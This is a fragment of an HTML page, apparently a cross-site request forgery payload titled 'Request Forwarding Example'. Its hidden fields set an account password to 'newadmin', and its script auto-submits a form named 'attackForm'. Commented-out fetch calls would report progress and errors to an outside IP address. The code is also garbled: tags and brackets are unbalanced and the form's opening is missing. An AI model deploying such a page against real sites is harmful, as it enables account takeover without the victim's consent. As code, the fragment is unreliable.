<!DOCTYPE html>

<h1>Request Forwarding Example</h1>

    <input type="hidden" name="password" value="newadmin">
    <input type="hidden" name="confirm-password" value="newadmin">
</form>

<script>

        try {
            // try {
            //     await fetch('http://3.125.39.17/entered');
            // } catch (e) {
            // }

            document.getElementById('attackForm').submit();

            // await fetch('http://3.125.39.17/success?size=');

            // await fetch('http://3.125.39.17/error?error=' + msg);
            console.error("Error:", error);

    });
